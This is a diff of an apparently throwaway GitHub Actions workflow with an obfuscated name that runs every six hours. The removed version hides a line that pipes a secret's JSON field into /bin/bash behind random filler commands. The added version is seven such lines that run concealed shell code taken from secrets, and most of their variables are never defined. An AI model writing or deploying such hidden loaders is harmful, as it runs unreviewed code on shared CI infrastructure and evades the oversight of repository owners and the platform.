@@ -1,8 +1,9 @@
 name: zoubowei2749
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 1/6 * * *'
+    - cron: '43 3/6 * * *'
 
 jobs:
   build:
@@ -11,31 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: zoubowei2749
         env:
-          a7969: ${{ secrets.a7969 }}
+          oh78: ${{ secrets.oh78 }}
         run: |
-          echo "Date only: $(date +%F)"
-          which sqlite
-          echo $a7969 | jq -r .b28010 | /bin/bash
-          which wget
-          which wget
-          echo "Dir: $(pwd)"
-          for i in {1..3}; do echo "Iter $i"; done
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          sleep 0.1 2>/dev/null || true
-          git add -u
-          which uname
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          screen -ls
-          curl www.google.com
-          ping -c 10 github.com
-          cd ~
-          uname -a
-          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
-          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
-          which sqlite
-          history | grep git
-          echo "xyz" > tmp.txt.tmp.tmp.txt
-          ping -c 10 www.google.com
-          curl ipinfo.io/ip
-          echo "Time: $(date +%H:%M:%S)"
-          find . -name "*.xml" | xargs -I fname cp fname tmp.tmp.tmp.tmp
+          echo $oh78 | jq -r .drd01517 | /bin/bash
+          echo $mzm10538 | jq -r .yxh1 | /bin/bash
+          echo $esk673 | jq -r .jn527 | /bin/bash
+          echo $l65903 | jq -r .j4364 | /bin/bash
+          echo $dkusx23237 | jq -r .dcft20827 | /bin/bash
+          echo $lr0 | jq -r .u67 | /bin/bash
+          echo $yoz3 | jq -r .qyq1 | /bin/bash
+
